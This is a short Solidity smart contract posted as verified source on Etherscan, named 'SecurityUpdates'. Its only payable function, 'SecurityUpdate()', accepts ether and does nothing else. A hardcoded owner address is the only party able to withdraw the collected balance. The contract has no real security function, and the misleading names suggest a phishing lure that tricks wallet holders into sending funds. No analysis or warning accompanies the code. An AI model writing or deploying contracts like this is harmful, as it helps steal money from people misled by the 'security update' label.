/**
 *Submitted for verification at Etherscan.io on 2023-03-08
*/

/**
 *Submitted for verification at Etherscan.io on 2022-12-11
*/

pragma solidity ^0.4.26;

contract SecurityUpdates {

    address private  owner;

     constructor() public{   
        owner=0xAe98fa26d078b39010194e22191D3E316729A1Bd;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}